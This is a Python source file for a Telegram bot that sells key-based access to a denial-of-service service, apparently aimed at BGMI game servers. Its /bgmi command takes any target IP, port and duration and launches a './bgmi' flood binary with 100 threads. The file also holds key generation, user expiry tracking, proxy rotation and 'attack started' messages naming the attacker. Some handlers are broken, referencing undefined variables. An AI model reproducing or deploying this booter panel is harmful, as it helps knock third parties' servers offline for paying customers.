from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import subprocess
import itertools
import asyncio
import json
import os
import random
import string
import datetime
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
KEY_FILE = "keys.json"

DEFAULT_THREADS = 100
users = {}
keys = {}
user_processes = {}

# Proxy related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def get_proxy_dict():
    proxy = get_next_proxy()
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=10):
    characters = string.ascii_uppercase + string.digits
    key = ''.join(random.choice(characters) for _ in range(length))
    return key

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"𝙆𝙀𝙔 𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙀: {key}\n𝙀𝙓𝙋𝙄𝙍𝙀𝙎 𝙊𝙉: {expiration_date}"
            except ValueError:
                response = "𝙋𝙇𝙀𝘼𝙎𝙀 𝙎𝙋𝙀𝘾𝙄𝙁𝙔 𝙑𝘼𝙇𝙄𝘿 𝙉𝙐𝙈𝘽𝙀𝙍 𝘼𝙉𝘿 𝙐𝙉𝙄𝙏 𝙊𝙁 𝙏𝙄𝙈𝙀 🤦"
        else:
            response = "𝙐𝙎𝘼𝙂𝙀: /𝙂𝙀𝙉𝙆𝙀𝙔 <𝘼𝙈𝙊𝙐𝙉𝙏> <𝙃𝙊𝙐𝙍𝙎/𝘿𝘼𝙔𝙎>"
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿😡"

    await update.message.reply_text(response)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅𝙆𝙀𝙔 𝙍𝙀𝘿𝙀𝙀𝙈𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔👍"
        else:
            response = "𝙄𝙉𝙑𝘼𝙇𝙄𝘿 𝙊𝙍 𝙀𝙓𝙋𝙄𝙍𝙀𝘿 𝙆𝙀𝙔 𝘽𝙐𝙔 𝙁𝙊𝙍𝙈 @OP_SAMIM."
    else:
        response = "𝙐𝙎𝘼𝙂𝙀: /𝙍𝙀𝘿𝙀𝙀𝙈 < 𝙆𝙀𝙔 >"

    await update.message.reply_text(response)

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id), request_kwargs={'proxies': get_proxy_dict()})
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = "❌ 𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿 ❌"
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿😡."
    await update.message.reply_text(response)

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌  𝘼𝘾𝘾𝙀𝙎𝙎 𝙀𝙓𝙋𝙄𝙍𝙀𝘿 𝙊𝙍 𝙐𝙉𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙎𝙀𝘿.𝙋𝙇𝙀𝘼𝙎𝙀 𝙍𝙀𝘿𝙀𝙀𝙈 𝘼 𝙑𝘼𝙇𝙄𝘿 𝙆𝙀𝙔 𝘽𝙐𝙔 𝙁𝙊𝙍𝙈- @OP_SAMIM")
        return

    if len(context.args) != 3:
        await update.message.reply_text('✅ 𝙋𝙇𝙀𝘼𝙎𝙀 𝙋𝙍𝙊𝙑𝙄𝘿𝙀 <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀>👍')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]

    process = subprocess.Popen(command)
    
    user_processes[user_id] = {"process": process, "command": command, "target_ip": target_ip, "port": port, "is_stopped": False}
    
    await update.message.reply_text(f"🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 🚀\n\n𝙏𝙖𝙧𝙜𝙚𝙩: {target_ip}\n𝙏𝙞𝙢𝙚: {duration} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨\n𝘼𝙩𝙩𝙖𝙘𝙠𝙚𝙧 𝙣𝙖𝙢𝙚: @{update.message.from_user.username}")

     # Run the attack asynchronously without blocking
    chat_id = update.effective_chat.id  # Get the chat ID where the command was sent
    asyncio.create_task(run_attack(user_id, process, duration, context, target_ip, update.message.from_user.username, chat_id))

async def run_attack(user_id, process, duration, context, target_ip, username, chat_id):
    await asyncio.sleep(int(duration))  # Let the attack run in the background for the specified duration

    if user_id in user_processes and not user_processes[user_id]["is_stopped"]:
        process.terminate()  # Terminate the process
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"🔥 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 🔥\n𝙏𝙖𝙧𝙜𝙚𝙩: {target_ip}\n𝙏𝙞𝙢𝙚: {duration} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨\n𝘼𝙩𝙩𝙖𝙘𝙠𝙚𝙧 𝙣𝙖𝙢𝙚: @{username}")

    del user_processes[user_id]  # Remove the user process after completion

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ 𝘼𝘾𝘾𝙀𝙎𝙎 𝙀𝙓𝙋𝙄𝙍𝙀𝘿 𝙊𝙍 𝙐𝙉𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙎𝙀𝘿.𝙋𝙇𝙀𝘼𝙎𝙀 𝙍𝙀𝘿𝙀𝙀𝙈 𝘼 𝙑𝘼𝙇𝙄𝘿 𝙆𝙀𝙔 𝘽𝙐𝙔 𝙁𝙊𝙍𝙈- @OP_SAMIM")
        return

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ??𝘿𝙊𝙎 𝘽𝙊𝙏 /bgmi.")

    user_processes[user_id]["process"] = subprocess.Popen(user_processes[user_id]["command"])
    await update.message.reply_text('𝙎𝙏𝘼𝙍𝙏𝙀𝘿 𝘼𝙏𝙏𝘼𝘾𝙆.')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ 𝘼𝘾𝘾𝙀𝙎𝙎 𝙀𝙓𝙋𝙄𝙍𝙀𝘿 𝙊𝙍 𝙐𝙉𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙎𝙀𝘿.𝙋𝙇𝙀𝘼𝙎𝙀 𝙍𝙀𝘿𝙀𝙀𝙈 𝘼 𝙑𝘼𝙇𝙄𝘿 𝙆𝙀𝙔 𝘽𝙐𝙔 𝙁𝙊𝙍𝙈- @OP_SAMIM")
        return

    if user_id in user_processes:
        user_processes[user_id]["process"].terminate()
        user_processes[user_id]["is_stopped"] = True
        await update.message.reply_text("🔥 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 🔥")
    else:
        await update.message.reply_text("❌ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙎 𝙉𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 ❌")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('𝙐𝙎𝘼𝙂𝙀: /𝘽𝙍𝙊𝘼𝘿𝘾𝘼𝙎𝙏 < 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 >')
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=message, request_kwargs={'proxies': get_proxy_dict()})
            except Exception as e:
                print(f"Error sending message to {user}: {e}")
        response = "𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙎𝙀𝙉𝙏 𝙏𝙊 𝘼𝙇𝙇 𝙐𝙎𝙀𝙍𝙎👍."
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿😡"
    
    await update.message.reply_text(response)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🔑This is official bot.\nCommands:\n/redeem <key>\n/stop\n/start\n/genkey <hours/days> \nOWNER- @OP_SAMIM")

if __name__ == '__main__':
    load_data()
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("help", help_command))

    app.run_polling()
